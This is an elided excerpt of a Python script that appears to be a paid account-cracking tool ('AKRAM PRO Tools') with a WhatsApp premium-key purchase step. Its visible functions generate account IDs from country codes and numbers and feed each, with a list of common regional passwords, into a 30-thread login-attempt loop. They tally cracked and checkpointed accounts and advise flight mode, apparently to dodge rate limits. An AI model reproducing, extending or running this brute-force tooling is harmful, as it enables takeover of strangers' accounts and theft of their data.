...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+9203230230320&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Akram Sir, I Need To Buy Your Paid AKRAM PRO Tools Version 1.Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                ...
                with tred(max_workers=30) as usman:     
                        ...
                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for Ok ids\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khanbaba','khan12','janjan','khan123','pak123','baloch','pak12345']
                                akram.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as akram:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
...
def gmail():
                ...
                with tred(max_workers=30) as usman:
                        ...
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for Ok ids\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
